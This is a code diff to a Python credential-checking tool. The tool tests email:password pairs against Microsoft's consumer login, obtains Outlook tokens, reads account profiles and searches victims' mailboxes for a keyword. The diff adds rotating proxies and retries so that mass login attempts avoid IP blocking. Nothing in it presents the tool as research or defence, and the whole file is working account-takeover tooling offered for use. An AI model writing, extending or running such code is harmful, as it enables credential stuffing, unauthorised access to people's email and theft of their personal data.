@@ -4,8 +4,12 @@ import json
 import re
 import time
 from fake_useragent import UserAgent
+from proxy_manager import proxy_manager
 
 _ua = UserAgent()
+
+MAX_RETRIES = 10
+
 
 def generate_user_agent():
     try:
@@ -13,10 +17,44 @@ def generate_user_agent():
     except:
         return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
+
 def checker_worker_single(email: str, password: str, keyword: str):
-    session = requests.Session()
+    """
+    Egy email:password ellenőrzése proxy rotációval.
+    Ha hiba van, új proxyval próbálja újra (max MAX_RETRIES).
+    """
+    retries = 0
+
+    while retries < MAX_RETRIES:
+        proxy_dict = proxy_manager.get_proxy()
+        session = requests.Session()
+
+        if proxy_dict:
+            session.proxies = proxy_dict
+
+        try:
+            result = _do_check(session, email, password, keyword)
+
+            if result["status"] in ("hit", "custom", "bad"):
+                return result
+
+            retries += 1
+            time.sleep(0.1)
+
+        except Exception:
+            retries += 1
+            time.sleep(0.1)
+        finally:
+            session.close()
+
+    return {"status": "error", "reason": f"Max retries ({MAX_RETRIES})"}
+
+
+def _do_check(session, email, password, keyword):
+    """A tényleges ellenőrzési logika (egy próbálkozás)"""
     try:
         user_agent = generate_user_agent()
+
         url = (
             "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
             f"client_info=1&haschrome=1&login_hint={email}"
@@ -29,7 +67,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
             "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "return-client-request-id": "false",
             "client-request-id": str(uuid.uuid4()),
             "x-ms-sso-ignore-sso": "1",
@@ -52,10 +90,10 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
         PPFT = ""
         urlPost = ""
-        
+
         server_data_pattern = r'var ServerData = ({.*?});'
         server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)
-        
+
         if server_data_match:
             try:
                 server_data_json = server_data_match.group(1)
@@ -109,7 +147,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
         headers_post = {
             "User-Agent": user_agent,
             "Pragma": "no-cache",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "Host": "login.live.com",
             "Connection": "keep-alive",
             "Content-Length": str(len(data_string)),
@@ -125,7 +163,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             "Referer": referer_url,
             "Accept-Encoding": "gzip, deflate",
             "Accept-Language": "en-US,en;q=0.9",
-            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; MSPOK={MSPOK}; OParams={OParams}"
+            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; MSPOK={MSPOK}; OParams={OParams}",
         }
 
         post_response = session.post(
@@ -164,7 +202,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                 "grant_type": "authorization_code",
                 "code": auth_code,
-                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
             }
             token_response = requests.post(
                 url_token, data=data_token,
@@ -194,7 +232,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             "X-AnchorMailbox": f"CID:{CID}",
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
+            "Accept-Encoding": "gzip",
         }
 
         pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
@@ -224,7 +262,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "Filter": {
                     "Or": [
                         {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                     ]
                 },
                 "From": 0,
@@ -233,27 +271,28 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "Size": 25,
                 "Sort": [
                     {"Field": "Score", "SortDirection": "Desc", "Count": 3},
-                    {"Field": "Time", "SortDirection": "Desc"}
+                    {"Field": "Time", "SortDirection": "Desc"},
                 ],
                 "EnableTopResults": True,
-                "TopResultsCount": 3
+                "TopResultsCount": 3,
             }],
             "AnswerEntityRequests": [{
                 "Query": {"QueryString": keyword},
                 "EntityTypes": ["Event", "File"],
                 "From": 0,
                 "Size": 100,
-                "EnableAsyncResolution": True
+                "EnableAsyncResolution": True,
             }],
             "QueryAlterationOptions": {
                 "EnableSuggestion": True,
                 "EnableAlteration": True,
                 "SupportedRecourseDisplayTypes": [
                     "Suggestion", "NoResultModification",
-                    "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
-                ]
+                    "NoResultFolderRefinerModification",
+                    "NoRequeryModification", "Modification",
+                ],
             },
-            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
+            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
         }
 
         search_headers = {
@@ -266,7 +305,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip",
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
         }
 
         search_response = requests.post(
@@ -277,16 +316,14 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if search_response.status_code == 200:
             search_text = search_response.text
 
-            # 🟢 ITT JAVÍTOTTAM A DÁTUMOT! 🟢
             date_start = search_text.find('"LastModifiedTime":"')
             if date_start != -1:
                 date_start += len('"LastModifiedTime":"')
                 date_end = search_text.find('"', date_start)
                 raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
-                # Átformázzuk "2024-03-05T14:30:00Z" -> "2024-03-05 14:30" -ra
                 if raw_date != "N/A":
                     Date = raw_date.replace("T", " ")[:16]
-            
+
             total_start = search_text.find('"Total":')
             if total_start != -1:
                 total_start += len('"Total":')
@@ -305,8 +342,8 @@ def checker_worker_single(email: str, password: str, keyword: str):
                     "name": Name,
                     "birthdate": Birthdate,
                     "date": Date,
-                    "mails": Total
-                }
+                    "mails": Total,
+                },
             }
         elif Name or Country:
             return {
@@ -316,13 +353,17 @@ def checker_worker_single(email: str, password: str, keyword: str):
                     "password": password,
                     "country": Country,
                     "name": Name,
-                    "birthdate": Birthdate
-                }
+                    "birthdate": Birthdate,
+                },
             }
         else:
             return {"status": "bad", "reason": "No data"}
 
+    except requests.exceptions.ProxyError:
+        return {"status": "error", "reason": "Proxy error"}
+    except requests.exceptions.ConnectTimeout:
+        return {"status": "error", "reason": "Proxy timeout"}
+    except requests.exceptions.ConnectionError:
+        return {"status": "error", "reason": "Connection error"}
     except Exception as e:
         return {"status": "error", "reason": str(e)}
-    finally:
-        session.close()
